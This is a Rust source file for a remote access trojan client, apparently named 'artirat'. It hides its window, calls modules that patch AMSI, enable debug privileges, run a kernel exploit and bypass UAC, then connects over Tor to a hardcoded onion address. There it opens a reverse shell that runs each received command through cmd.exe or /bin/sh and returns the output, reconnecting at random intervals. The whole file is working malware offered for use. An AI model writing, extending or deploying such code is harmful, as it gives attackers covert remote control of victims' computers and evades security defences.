#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
#[cfg(target_os = "windows")]
use artirat_client::{amsi_patch,uac_bypass,debug_privileges,kernel_exploit};
use std::env;
use arti_client::{TorClient, TorClientConfig, DataStream};
use tor_rtcompat::PreferredRuntime;
use tokio::io::split;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::process::Command;

use anyhow::{Result, anyhow};
use gethostname::gethostname;
use tokio::time::{sleep, Duration};
use rand::Rng;

/// Public configuration struct (so lib users can customize)
#[derive(Clone, Debug)]
pub struct ClientConfig {
    pub onion: String,
    pub port: u16,
}

impl Default for ClientConfig {
    fn default() -> Self {
        Self {
            onion: "7i6xbfs5e7uxxvjadr2nse3yeirqs5oolkypnajr37puw22uhkwz7nqd.onion".into(),
            port: 1337,
        }
    }
}

/// Initialize Tor client (exported for lib usage)
pub async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
    let config = TorClientConfig::default();
    let client = TorClient::create_bootstrapped(config).await?;
    println!("Initialized Tor Client");
    Ok(client)
}
pub fn is_admin() -> bool {
    #[cfg(target_os = "windows")]
    {
        use windows::Win32::Foundation::CloseHandle;
        use windows::Win32::Security::{
            GetTokenInformation, OpenProcessToken, TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY,
        };
        use windows::Win32::System::Threading::GetCurrentProcess;

        unsafe {
            let mut token = Default::default();

            if !OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token).as_bool() {
                return false;
            }

            let mut elevation = TOKEN_ELEVATION::default();
            let mut size = 0;

            let result = GetTokenInformation(
                token,
                TokenElevation,
                Some(&mut elevation as *mut _ as *mut _),
                std::mem::size_of::<TOKEN_ELEVATION>() as u32,
                &mut size,
            );

            CloseHandle(token);

            result.as_bool() && elevation.TokenIsElevated != 0
        }
    }

    #[cfg(target_family = "unix")]
    {
        unsafe { libc::geteuid() == 0 }
    }
}
/// Build prompt string
pub fn build_prompt() -> String {
    let user = std::env::var("USER")
        .or_else(|_| std::env::var("USERNAME"))
        .unwrap_or_else(|_| "unknown".into());

    let host = gethostname()
        .into_string()
        .unwrap_or_else(|_| "host".into());

    let cwd = std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_else(|_| "?".into());

    format!("{}@{} [{}] >> ", user, host, cwd)
}

/// Execute a command
pub async fn run_command(input: &str) -> Result<Vec<u8>> {
    let mut parts = input.trim().split_whitespace();

    let cmd = parts.next().ok_or_else(|| anyhow!("Empty command"))?;
    let args: Vec<&str> = parts.collect();

    if cmd == "cd" {
        let target = args.get(0).ok_or_else(|| anyhow!("cd: missing argument"))?;

        match env::set_current_dir(target) {
            Ok(_) => {
                let cwd = env::current_dir()?;
                return Ok(format!("Changed directory to {}\n", cwd.display()).into_bytes());
            }
            Err(e) => {
                return Ok(format!("cd error: {}\n", e).into_bytes());
            }
        }
    }

    #[cfg(target_os = "windows")]
    let mut command = {
        let mut c = Command::new("cmd.exe");
        c.arg("/C")
            .arg(input)
            .creation_flags(0x08000000);
        c
    };

    #[cfg(not(target_os = "windows"))]
    let mut command = {
        let mut c = Command::new("/bin/sh");
        c.arg("-c").arg(input);
        c
    };

    let output = command.output().await?;

    let mut result = Vec::new();
    result.extend_from_slice(&output.stdout);
    result.extend_from_slice(&output.stderr);

    if result.is_empty() {
        result.extend_from_slice(b"(no output)\n");
    }

    if !result.ends_with(b"\n") {
        result.push(b'\n');
    }

    Ok(result)
}

/// Connect to onion service
pub async fn connect_onion(
    tor_client: &TorClient<PreferredRuntime>,
    onion_addr: &str,
    port: u16,
) -> Result<DataStream> {
    Ok(tor_client.connect((onion_addr, port)).await?)
}

/// Session loop
pub async fn read_loop(stream: DataStream) -> Result<()> {
    let (mut reader, mut writer) = split(stream);

    let mut buf = [0u8; 4096];
    let mut buffer = String::new();

    writer.write_all(build_prompt().as_bytes()).await?;
    writer.flush().await?;

    loop {
        let n = reader.read(&mut buf).await?;

        if n == 0 {
            println!("Connection closed by remote");
            break;
        }

        buffer.push_str(&String::from_utf8_lossy(&buf[..n]));

        while let Some(pos) = buffer.find('\n') {
            let mut line = buffer[..pos].to_string();
            buffer.drain(..=pos);

            line = line.trim().to_string();

            if line.is_empty() {
                writer.write_all(build_prompt().as_bytes()).await?;
                writer.flush().await?;
                continue;
            }

            let output = run_command(&line).await?;
            writer.write_all(&output).await?;

            writer.write_all(build_prompt().as_bytes()).await?;
            writer.flush().await?;
        }
    }

    Ok(())
}

/// Core runner (THIS is what you export for lib usage)
pub async fn netclient_run(config: ClientConfig) -> Result<()> {
    loop {
        println!("Attempting to connect...");

        let tor_client = init_tor().await?;

        match connect_onion(&tor_client, &config.onion, config.port).await {
            Ok(stream) => {
                println!("Connected to onion service");

                if let Err(e) = read_loop(stream).await {
                    println!("Session error: {}", e);
                }

                println!("Connection closed, will reconnect...");
            }
            Err(e) => {
                println!("Connection failed: {}", e);
            }
        }

        let mut rng = rand::thread_rng();
        let delay: u64 = rng.gen_range(31..=121);

        println!("Reconnecting in {} seconds...", delay);
        sleep(Duration::from_secs(delay)).await;
    }
}

/// Exportable async entrypoint for library users
pub async fn netclient() -> Result<()> {
    #[cfg(target_os = "windows")]
    amsi_patch::amsi_patch();
    #[cfg(target_os = "windows")]
    debug_privileges::enable_debug_privileges();
    #[cfg(target_os = "windows")]
    kernel_exploit::kernel_exploit();
    
    let exe_path = env::current_exe()?;
    let exe_path_str = exe_path.to_string_lossy().to_string();
    if is_admin(){
        netclient_run(ClientConfig::default()).await
    } else {
        #[cfg(target_os = "windows")]
        uac_bypass::generate_inf_file(exe_path_str);
        netclient_run(ClientConfig::default()).await
    }
}

/// Actual binary entrypoint (thin wrapper)
#[tokio::main]
async fn main() -> Result<()> {
    netclient().await
}